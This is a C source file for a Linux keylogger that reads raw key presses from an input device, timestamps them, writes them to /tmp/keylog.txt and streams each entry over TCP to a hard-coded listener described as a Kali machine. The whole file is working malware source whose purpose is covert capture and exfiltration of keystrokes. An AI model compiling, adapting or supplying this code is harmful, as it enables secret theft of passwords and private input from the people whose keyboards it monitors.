#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>

const char *keys[] = {
    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace", "Tab",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "Enter", "Ctrl",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "Shift",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "Shift", "*", "Alt", "Space",
    "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
    "NumLock", "ScrollLock", "Home", "Up", "PageUp", "-", "Left", "Center", "Right", "+",
    "End", "Down", "PageDown", "Insert", "Delete", "", "", "", "F11", "F12", 
    // Extend for arrows and special keys
    [103] = "ArrowUp",
    [105] = "ArrowLeft",
    [106] = "ArrowRight",
    [108] = "ArrowDown"
};

int main() {
    // 1. Open keyboard device (replace event3 with your keyboard device)
    int fd = open("/dev/input/event3", O_RDONLY);
    if (fd == -1) {
        perror("Cannot open input device");
        return 1;
    }

    // 2. Open log file
    FILE *log = fopen("/tmp/keylog.txt", "a");
    if (!log) {
        perror("Cannot open log file");
        return 1;
    }

    // 3. Create TCP socket to Kali
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        sock = -1;
    } else {
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(5555);                // Kali listening port
        server.sin_addr.s_addr = inet_addr("192.168.48.128"); // Replace with Kali IP

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            perror("Connect failed");
            sock = -1; // fall back to local logging
        }
    }

    struct input_event ev;
    while (1) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 1) { // key press
            if (ev.code < sizeof(keys)/sizeof(keys[0])) {
                // 4. Get timestamp
                time_t now = time(NULL);
                struct tm *t = localtime(&now);
                char timestamp[32];
                strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", t);

                // 5. Prepare log entry
                char buffer[128];
                snprintf(buffer, sizeof(buffer), "%s %s\n", timestamp, keys[ev.code]);

                // 6. Log locally
                fprintf(log, "%s", buffer);
                fflush(log);

                // 7. Send to Kali if connected
                if (sock != -1) {
                    send(sock, buffer, strlen(buffer), 0);
                }
            }
        }
    }

    if (sock != -1) close(sock);
    fclose(log);
    close(fd);
    return 0;
}
